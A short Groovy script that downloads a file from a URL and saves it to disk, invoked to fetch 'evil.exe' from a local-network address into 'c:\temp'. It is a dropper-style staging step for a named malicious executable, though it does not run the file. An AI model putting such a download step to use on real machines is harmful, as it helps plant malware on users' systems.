import java.nio.file.Files
import java.nio.file.Paths

def downloadAndSaveExe(String fileUrl, String savePath) {
    try {
        URL url = new URL(fileUrl)
        byte[] fileBytes = url.openStream().withStream { inputStream ->
            inputStream.bytes
        }

        Files.write(Paths.get(savePath), fileBytes)
        println "File downloaded and saved successfully to: $savePath"
    } catch (Exception e) {
        println "An error occurred: ${e.message}"
    }
}

String url = 'http://192.168.1.1/evil.exe'
String saveLocation = 'c:\\temp\\evil.exe'

downloadAndSaveExe(url, saveLocation)
